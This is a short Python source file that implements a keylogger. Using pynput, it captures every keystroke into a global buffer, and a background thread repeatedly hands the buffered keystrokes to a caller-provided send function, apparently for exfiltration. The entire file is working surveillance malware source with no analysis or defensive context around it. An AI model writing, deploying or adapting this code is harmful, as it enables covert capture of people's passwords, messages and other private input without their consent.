from pynput import keyboard
import threading

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += " " + str(key) + " "

def start_keylogger(send_data_function):
    global send_data
    send_data = send_data_function
    
    def log_keys():
        global log
        while True:
            if log:
                send_data({"keystrokes": log})
                log = ""
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Use a separate thread to send data periodically
    log_thread = threading.Thread(target=log_keys)
    log_thread.start()
    
    listener.join()
